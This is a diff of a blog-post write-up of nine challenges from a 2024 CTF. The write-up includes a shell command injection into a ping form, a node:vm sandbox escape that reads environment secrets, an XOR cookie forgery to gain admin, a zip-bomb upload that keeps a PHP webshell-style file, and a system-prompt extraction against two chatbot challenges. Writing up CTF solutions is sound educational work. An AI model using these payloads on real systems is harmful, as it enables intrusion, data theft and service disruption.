@@ -9,6 +9,7 @@ tags:
   - puctf
 description: Writeup of 9 different challenges from the PolyU x NuttyShell 2024 CTF. 
 ---
+
 import Alert, { DefaultAlertTypes } from "@components/Alert.astro";
 
 The PolyU x NuttyShell CTF was held from March 1st to March 3rd, and I participated as an invited team.
@@ -18,10 +19,11 @@ Our team (I009 - EzAntiPwn) placed 19th out of all 98 teams, and 5th out of 9 in
 ## Table of contents
 
 ## Hay K1K1 奪渏賽 - #ai
+
 > How to get a girl friend?
-> 
+>
 > 你能否奪得琪渏的芳心?
-> 
+>
 > https://poe.com/NuttyShell_K1K1
 
 There were four total AI challenges in this CTF, and I personally was able to solve two of them, using the same payload.
@@ -38,10 +40,11 @@ Putting it into the chatbot, and we get the original prompt back:
 Flag: `PUCTF24{K1K1_wants_a_d0g_1nstead_0f_a_cat}`
 
 ## SalaryThief 薪水小偷 - #ai
+
 > Who is SalaryThief?
-> 
+>
 > 誰是薪水小偷?
-> 
+>
 > https://poe.com/Nutty_SalaryThief
 
 Using the same payload, we get the flag on the second try:
@@ -51,16 +54,18 @@ Using the same payload, we get the flag on the second try:
 Flag: `PUCTF24{SalaryThief_1s_p00r_hahaha}`
 
 ## Easy Web Login 走進Web之道 - #web
+
 > Where is the road to next step?
-> 
+>
 > 尋道者，道在何方？
-> 
+>
 > http://chal.polyuctf.com:41343
 
 The challenge page greets us with the message `Please Use "NuttyShell Browser" to login`.
 ![screenshot of challenge page](https://i.sportshead.dev/zgps8nb.png)
 
 Let's try using curl to set the User-Agent:
+
 ```html
 $ curl -H "User-Agent: NuttyShell Browser" http://chal.polyuctf.com:41343/
 ...
@@ -89,6 +94,7 @@ $ curl -H "User-Agent: NuttyShell Browser" http://chal.polyuctf.com:41343/
 ```
 
 Let's try to login:
+
 ```html
 $ curl -H "User-Agent: NuttyShell Browser" "http://chal.polyuctf.com:41343/?username=guest&password=guest"
 ...
@@ -142,36 +148,41 @@ Hmm, we only get back the sign in page. After a bit of testing it turns out that
 
 And we get the second half of the flag!
 
-Flag: `PUCTF24{1ntr0duct10n_2_web_cha11enge_9bab4b5548d56a8e}`    
+Flag: `PUCTF24{1ntr0duct10n_2_web_cha11enge_9bab4b5548d56a8e}`
 
 ## Secret Flag 秘旗 - #web
+
 > Do Easy Web Login first before solve this challenge
-> 
+>
 > 請先完成 走進Web之道 再解此題目
-> 
+>
 > Where is the flag?
-> 
+>
 > 旗在何方？
-> 
+>
 > http://chal.polyuctf.com:41343
 
 If we try to ping an IP, it seems that the server runs the `ping` command:
 ![ping command ran on 127.0.0.1](https://i.sportshead.dev/py0j0nu.png)
 
 Let's try some shell injection:
+
 ```bash
 127.0.0.1" -n 1 && ls /
 ```
+
 ![error message "You are hacker"](https://i.sportshead.dev/16xhmfr.png)
 
 Seems like there's a filter on the input. What if we try a simpler payload?
+
 ```bash
 localhost && ls /
 ```
+
 ![exploited page with ls output](https://i.sportshead.dev/ecab99.png)
 
 That worked! Now if we `ls /app`:
-![ls /app output](https://i.sportshead.dev/o97pxdc.png)    
+![ls /app output](https://i.sportshead.dev/o97pxdc.png)
 
 And now `cat /app/flag.txt`:
 ![cat /app/flag.txt output showing flag](https://i.sportshead.dev/pzn872v.png)
@@ -179,16 +190,18 @@ And now `cat /app/flag.txt`:
 Flag: `PUCTF24{Rem0te_C0de_Execut10n_exp101t_thr0ugh_c0mmand_1nject10n}`
 
 ## Admin lost his credential 管理員失去憑證 - #web
+
 > Administrator lost his credential. Anyone can help him recover the login credential?
-> 
+>
 > 管理員唔見左登入憑證，有冇人可以幫佢搵翻個憑證？
-> 
+>
 > http://chal.polyuctf.com:41342
 
 The challenge page is a login page:
 ![login page screenshot](https://i.sportshead.dev/rv4jqf7i.png)
 
 Helpfully, we get a zip file with the program's source code. Unzipping it gives us one file [`app.py`](https://gist.github.com/sportshead/925684621ee74244f9ca3aaf404682b6#file-app-py):
+
 ```python=
 ...
 app = Flask(__name__)
@@ -294,8 +307,9 @@ def decrypt(cipher):
     return output
 ...
 ```
+
 There are no SQL injections anywhere in the program, but we can see a curious `encrypt` and `decrypt` function, which seem to be used for the session token.
-On line 59, the `login` route uses the `encrypt` function to encrypt the username and admin status. On line 71, the `profile` route uses the `decrypt` function to read data from the cookie. 
+On line 59, the `login` route uses the `encrypt` function to encrypt the username and admin status. On line 71, the `profile` route uses the `decrypt` function to read data from the cookie.
 If we can somehow manage to reverse the encryption function, we can create a cookie that will let us be admin!
 
 Taking a look at the `encrypt` function shows us that it is a simple XOR and then base64 function. Since we have a ciphertext and also the known plaintext, we can simply XOR them together to
@@ -311,10 +325,11 @@ Overwriting the key in our browser gets us the flag:
 Flag: `PUCTF24{y0u_kn0w_h0w_t0_b5c0m5_adm1n15tr4t0r_3af9b6a0718c4e239d5c6fe802b9e517}`
 
 ## Simple Hello - #web
+
 > Good morning!
-> 
+>
 > 早安!
-> 
+>
 > http://chal.polyuctf.com:41339
 
 The challenge page is very simple, with a text box and a submit button:
@@ -378,17 +393,18 @@ Let's try some payloads and see what we can get.
 Hmm, the only global available to us is `nickname`. The [`node:vm` documentation](https://nodejs.org/api/vm.html) tells us more:
 
 > The node:vm module enables compiling and running code within V8 Virtual Machine contexts.
-> 
+>
 > **The node:vm module is not a security mechanism. Do not use it to run untrusted code.**
-> 
+>
 > JavaScript code can be compiled and run immediately or compiled, saved, and run later.
-> 
+>
 > A common use case is to run the code in a different V8 Context. This means invoked code has a different global object than the invoking code.
 
 Helpfully, we learn that "The node:vm module is not a security mechanism." Let's see what payloads we can use to break out of this sandbox. A quick google search leads us to a helpful
 article [The unsecure node vm module](https://thegoodhacker.com/posts/the-unsecure-node-vm-module/).
 
 In the context of the VM, `this` refers to the `context` object, which we can use to escape using `.constructor`:
+
 ```js
 "; nickname= this.constructor.constructor("return this")(); // Hello, [object global]!
 ```
@@ -400,11 +416,13 @@ Let's get the keys available to us:
 ```
 
 Nice, we can get to the `global` variable! Now we just need to get the `FLAG` from env:
+
 ```js!
 "; nickname= this.constructor.constructor("return this")().global.process.env.FLAG; // Hello, PUCTF24{n0d3js_vm_1s_n07_s3cur3_cdd9e68f1bfb49641e59a798abec1181}!
 ```
 
 ## Review 審計 - #web
+
 <Alert type={DefaultAlertTypes.note}>
   Unfortunately I was unable to finish all of these writeups before the CTF platform closed,
   so I don't have the descriptions of any challenges from this point on.
@@ -413,6 +431,7 @@ This is one of the challenges that I enjoyed more. The challenge page is a simpl
 ![screenshot of challenge page](https://i.sportshead.dev/u2fyful.png)
 
 Let's check the source code of the server for some info:
+
 ```php=
 <?php
 if(isset($_POST["submit"])){
@@ -447,7 +466,7 @@ if(isset($_POST["submit"])){
                 $filename = $zip->getNameIndex($i);
                 $fileinfo = pathinfo($filename);
                 copy("zip://"."./uploads/" . $_FILES["file"]["name"]."#".$filename, $dir . "/". $fileinfo['basename']) or die("Unzip failed!");
-            }                   
+            }
             $zip->close();
 
             $files = scandir($dir);
@@ -488,13 +507,15 @@ If we can somehow bypass this deletion of files, we can upload a `.php` file and
 
 We can see that the server tries to extract every file before checking file extensions. By causing the server to fail to extract the files after our php payload, we can keep our php file on the server and get the flag.
 
-By uploading a zip bomb, we can cause the server to run out of storage before it fully unzips the whole archive. Unfortunately, the classic 42.zip file is a recursive zip file, meaning it relies on the unzipping software extracting each `.zip` file contained in the underlying layers. 
+By uploading a zip bomb, we can cause the server to run out of storage before it fully unzips the whole archive. Unfortunately, the classic 42.zip file is a recursive zip file, meaning it relies on the unzipping software extracting each `.zip` file contained in the underlying layers.
 We can however use the non-recursive zip bomb technique from [bamsoftware.com](https://www.bamsoftware.com/hacks/zipbomb/) to create a zip file less than the 2MB cap that extracts to a huge size. By creating a "template zip" with our payload php named `0000000pwn.php` (to try to make sure it is unzipped first), we can use the David Fifield's python script to generate our custom zipbomb:
+
 ```php=
 <?php
 readfile("../../flag.php");
 ?>
 ```
+
 ```bash
 $ zip -9 pwn.zip 0000000pwn.php
   adding: 0000000pwn.php (deflated 3%)
@@ -510,6 +531,7 @@ And as a good CTF player, I let the admins know to reset the server:
 ![discord ticket with admin saying "Restarted, but plz don't upload again"](https://i.sportshead.dev/wcxcfqx.png)
 
 ## Let me Code - #misc
+
 The challenge gives us a barcode, which we can easily decode with an online reader:
 ![decoder website showing barcode and bitly link](https://i.sportshead.dev/aud1pqq.png)
 
@@ -549,6 +571,7 @@ $ yt-dlp https://www.youtube.com/watch?v=U2zYzL6A5Q8
 ```
 
 Using [`ffmpeg`](https://ffmpeg.org/) we can extract the frames from the video:
+
 ```bash
 $ ffmpeg -i Let\ me\ Code\ \[U2zYzL6A5Q8\].webm -vf mpdecimate,setpts=N/FRAME_RATE/TB output_%04d.png
 ffmpeg version 6.0 Copyright (c) 2000-2023 the FFmpeg developers
@@ -578,6 +601,7 @@ video:7895kB audio:0kB subtitle:0kB other streams:0kB global headers:0kB muxing 
 ```
 
 We can now use [`zbarimg`](https://github.com/mchehab/zbar) to get the data from each barcode:
+
 ```bash
 $ zbarimg -q --raw output_00*
 fb2f733280a4292f9ca4005cb42817d1a66a4a69
@@ -669,6 +693,7 @@ PUCTF24{Y0u_hav3_m4st3r_th3_ski11s_0f_TUNING_i75gj90qwok3hty}
 ## Incognito Mode 讀後即痕 - #forensic
 
 We get a download file named `CTF_browser.7z`, which has this structure:
+
 ```
 .
 └── Google
@@ -679,6 +704,7 @@ We get a download file named `CTF_browser.7z`, which has this structure:
 ```
 
 Seems like a Chrome data directory dump. A quick google search gets us a [stack overflow answer](https://superuser.com/a/1547319) tells us that there is an sqlite file called `History` with history data. We can use sqlite to extract the data:
+
 ```sql
 $ sqlite3 History
 SQLite version 3.41.2 2023-03-22 11:56:21
@@ -713,4 +739,5 @@ Item number 50 is a suspicious looking [bit.ly link](https://bit.ly/4bM9qbz), wh
 Flag: `PUCTF24{Br0ws1ng_hist0ry_15_4_g0ld_m1ne_B2FF03E65}`
 
 ## Conclusion
+
 This year's CTF had a wide range of challenges, all with varying skill levels. I learnt a lot through this challenge and look forward to taking part in next year's competition.
